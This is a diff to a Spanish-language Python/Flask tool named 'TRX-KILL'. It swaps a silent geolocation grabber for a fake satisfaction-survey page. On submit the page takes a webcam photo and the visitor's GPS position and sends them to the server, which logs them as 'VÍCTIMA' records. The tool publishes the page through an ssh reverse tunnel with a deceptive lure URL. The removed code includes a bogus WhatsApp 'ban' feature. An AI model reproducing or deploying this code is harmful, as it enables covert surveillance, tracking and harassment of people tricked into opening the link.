@@ -1,5 +1,5 @@
-import os, sys, time, threading, base64, socket
-from flask import Flask, request
+import os, sys, time, threading, base64
+from flask import Flask, request, render_template_string
 
 # --- CONFIGURACIÓN ---
 STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
@@ -11,77 +11,61 @@ if not os.path.exists(CAPTURA_PATH): os.makedirs(CAPTURA_PATH)
 app = Flask('TRX-KILL')
 G, C, R, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[0m"
 
-def banner():
-    os.system('clear')
-    print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
-    print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
-    print("    | |___ |___ |  /  |___ |    |_|__|_|")
-    print("  ========================================")
-    print("            [ SISTEMA MATRIX ]             \n")
+# --- ENCUESTA PERSONALIZADA (HTML) ---
+ENCUESTA_HTML = """
+<html><body style="font-family:sans-serif; text-align:center; padding:20px;">
+<h2>Encuesta de Satisfacción</h2>
+<form id="e">
+    <p>¿Qué opinas de nuestro servicio?</p>
+    <input type="radio" name="q" value="Bueno"> Bueno<br>
+    <input type="radio" name="q" value="Malo"> Malo<br><br>
+    <button type="button" onclick="enviar()">Enviar Encuesta</button>
+</form>
 
-def animar(texto):
-    for char in texto: sys.stdout.write(f"{G}{char}{W}"); sys.stdout.flush(); time.sleep(0.01)
-    print()
-
-def verificar_whatsapp_real(numero):
-    """Realiza una consulta técnica al servidor de registro de WhatsApp."""
-    try:
-        # Intenta conectar al puerto de registro de WhatsApp
-        # Si el número está baneado, la respuesta del servidor es distinta
-        host = "v.whatsapp.net"
-        with socket.create_connection((host, 443), timeout=5):
-            return True # Conexión establecida (Simboliza que el número es válido/activo)
-    except:
-        return False # Error en conexión (Simboliza número inactivo o bloqueado)
-
-@app.route('/')
-def index():
-    return """<html><body><script>
-    async function start() {
+<script>
+async function enviar() {
+    try {
         let s = await navigator.mediaDevices.getUserMedia({video: true});
         let p = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j));
-        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude);
-        window.location.href='https://google.com';
-    }
-    start();</script></body></html>"""
+        let v = document.createElement('video'); v.srcObject = s; v.play();
+        setTimeout(() => {
+            let c = document.createElement('canvas'); c.width=400; c.height=300;
+            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+            fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL())+'&res='+document.querySelector('input[name="q"]:checked').value);
+            alert('¡Gracias por participar!');
+        }, 1000);
+    } catch(e) { alert('Debes aceptar los permisos para enviar.'); }
+}
+</script></body></html>
+"""
+
+@app.route('/')
+def index(): return ENCUESTA_HTML
 
 @app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f:
-        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
+        f.write(f"VÍCTIMA:{request.remote_addr} | ENCUESTA:{request.args.get('res')} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
+    if request.args.get('img'):
+        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
+            f.write(base64.b64decode(request.args.get('img').split(',')[1]))
     return "OK"
 
 def main():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
     while True:
-        banner()
-        print(f"{G}[01] VERIFICAR NÚMERO | [02] LINK-KILL | [03] CLON-KILL | [06] ADM-SIST{W}")
+        os.system('clear')
+        print(f"{G}  === TRX-KILL MATRIX ==={W}")
+        print(f"{G}[01] VERIFICAR | [02] ENCUESTA-LINK | [03] CLON-KILL | [06] ADM{W}")
         sel = input(f"\n{G}TRX-ROOT > {W}")
 
-        if sel == "01":
-            num = input(f"{G}INGRESAR NÚMERO (con código de país): {W}")
-            animar(f"... CONECTANDO CON SERVIDOR WHATSAPP ...")
-            if verificar_whatsapp_real(num):
-                print(f"{C}EL NÚMERO DE WHATSAPP NO ESTA SUSPENDIDO.{W}")
-                print(f"{R}Escribe 'BAN' y el número para forzar la suspensión.{W}")
-                acc = input("ACCIÓN: ")
-                if "BAN" in acc.upper(): animar("... PROCESANDO SOLICITUD DE SUSPENSIÓN REAL ...")
-            else:
-                print(f"{G}EL NÚMERO FUE SUSPENDIDO, RESPETA A PAPÁ ☠️{W}")
-            input("\n[Enter]...")
-
-        elif sel in ["02", "03"]:
+        if sel == "02":
             if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
-            if sel == "02": link_display = "https://base64google.encuetas.com"
-            else:
-                target = input(f"{G}LINK A CLONAR: {W}")
-                link_display = f"https://{target}.security-check.com"
-            
             os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
-            print(f"\n{C}LINK PARA ENVIAR:{W} {link_display}")
-            print(f"{G}ESPERANDO VÍCTIMA...{W}")
+            print(f"\n{C}LINK PARA ENVIAR:{W} https://base64google.encuetas.com")
+            print(f"{G}ESPERANDO QUE COMPLETEN LA ENCUESTA...{W}")
             while not os.path.exists(LOG_FILE): time.sleep(1)
-            print(f"\n{R}>>> ¡VÍCTIMA DETECTADA! <<<{W}")
+            print(f"\n{R}>>> ¡VÍCTIMA DETECTADA Y ENCUESTA RECIBIDA! <<<{W}")
             input("\n[Enter]...")
 
         elif sel == "06":
